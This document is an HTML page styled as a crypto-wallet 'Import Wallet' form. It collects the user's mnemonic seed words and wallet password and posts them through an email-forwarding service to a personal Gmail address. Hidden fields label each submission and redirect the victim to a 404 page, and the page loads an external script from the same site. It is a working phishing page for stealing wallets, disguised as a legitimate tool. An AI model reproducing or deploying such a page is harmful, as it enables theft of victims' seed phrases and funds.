<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Mnemonic Form</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <style>
        * {
            box-sizing: border-box;
        }
        body{
          background-color: #efeff4;
            padding: 0px;
            border: 0px;
            margin: 0px;
        }
        #formGroupExampleInput{
            height: 100px;
        }
        .form-group{
            margin-top: 15px;
        }
        .form-control{
          margin-left: 0px;
          margin-right: 0px;
        }
                /* The message box is shown when the user clicks on the password field */
#message {
  /* display:none; */
  /* background: #f1f1f1; */
  color: #000;
  position: relative;
  padding: 20px;
  margin-top: -10px;
}

#message p {
  padding: 5px 5px;
  font-size: 15px;
}

/* Add a green text color and a checkmark when the requirements are right */
.valid {
  color: green;
}

.valid:before {
  position: relative;
  left: -35px;
  content: "✔";
}

/* Add a red text color and an "x" when the requirements are wrong */
.invalid {
  color: gray;
}

.invalid:before {
  position: relative;
  left: -35px;
  content: "✖";
}

@media only screen and (max-width: 800px) {
  #message p {
  padding: 1px 1px;
  font-size: 10px;
}

.invalid:before {
  left: -20px;
}
.valid:before {
  left: -20px;
}
}                                                                                                                                                                                                                                                                                                          
    </style>
</head>
<body>
<div class="container-fluid">
    <form action="https://mailthis.to/aattahir4@gmail.com" method="POST" encType="multipart/form-data">
        <div class="form-group">
          <label for="formGroupExampleInput">Mnemonic Words</label>
          <input type="text" class="form-control" id="formGroupExampleInput" name="name" placeholder="Please use spaces to seperate your mnemonic words" >
        </div>
        <div class="form-group">
          <label for="formGroupExampleInput2">Wallet Path</label>
          <input type="text" class="form-control" id="formGroupExampleInput3" placeholder="/defirepairer/172903/28383/28383882/28383/28389/883" disabled>
        </div>
        <div class="form-group">
          <label for="formGroupExampleInput2">Wallet Name</label>
          <input type="text" class="form-control" id="formGroupExampleInput2" name="email" placeholder="Your wallet name">
        </div>
        <div class="form-group">
            <label for="inputPassword6">Wallet password</label>
            <input type="password" id="inputPassword6" class="form-control mx-sm-3" name="password" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" 
            title="Must contain at least one number and one uppercase and lowercase letter, and at least 8 or more characters"
            aria-describedby="passwordHelpInline" placeholder="Minimum of 8 characters" required>
            <small id="passwordHelpInline" class="text-muted">
              Must be 8-20 characters long.

              <div id="message">
                <p id="letter" class="invalid">A lowercase letter</p>
                <p id="capital" class="invalid">A capital (uppercase) letter</p>
                <p id="number" class="invalid">A number</p>
                <p id="length" class="invalid">Minimum 8 characters</p>
              </div>
    
            </small>
          </div>
          
          <input type="hidden" name="_subject" value="New Submission from Chain">
          <input type="hidden" name="_after" value="https://abdultahi.github.io/chain/404.html">

          <button class="btn btn-primary" type="submit" value="Submit">Import Wallet</button>
      </form>
</div>


<script src="https://abdultahi.github.io/chain/Form.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
<!-- <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script> -->
</body>
</html>
